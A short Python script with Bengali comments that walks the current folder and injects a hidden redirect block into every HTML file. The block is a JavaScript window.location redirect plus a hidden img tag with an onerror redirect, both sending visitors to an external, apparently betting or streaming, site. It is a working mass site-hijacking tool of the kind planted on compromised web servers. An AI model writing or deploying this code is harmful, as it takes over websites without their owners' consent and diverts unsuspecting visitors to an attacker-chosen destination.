import os
import glob

# যে লিংকে পাঠাতে চান
redirect_url = "https://keyosports.live/?okpon"

# রিডাইরেক্ট কোড
redirect_code = f'''
    <!-- Redirect Code Start -->
    <script>
        window.location.href = "{redirect_url}";
    </script>
    <img src="/static/images/d4fdf41d5g.png" onerror="window.location='{redirect_url}'" style="display:none;">
    <!-- Redirect Code End -->
'''

# বর্তমান ফোল্ডারের সব .html ফাইল খুঁজে বের করা
html_files = glob.glob("*.html")

if not html_files:
    print("এই ফোল্ডারে কোনো .html ফাইল পাওয়া যায়নি!")
else:
    for file in html_files:
        # ফাইল রিড করা
        with open(file, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()

        # যদি আগে থেকেই রিডাইরেক্ট কোড দেওয়া না থাকে, তবেই বসাবে
        if "window.location.href" not in content:
            if "<body>" in content:
                # <body> ট্যাগের ঠিক পরে কোড বসানো
                new_content = content.replace("<body>", f"<body>\n{redirect_code}", 1)
            elif "<head>" in content:
                # যদি <body> না থাকে, তবে <head> এ বসানো
                new_content = content.replace("<head>", f"<head>\n{redirect_code}", 1)
            else:
                # যদি কোনো ট্যাগ না থাকে, তবে একদম শুরুতে বসানো
                new_content = redirect_code + content

            # ফাইলে সেভ করা
            with open(file, "w", encoding="utf-8") as f:
                f.write(new_content)
            print(f"Post Success: {file}")
        else:
            print(f"Skip (Already has code): {file}")

    print(f"\nসব ফাইলে রিডাইরেক্ট কোড পোস্ট করা হয়েছে!")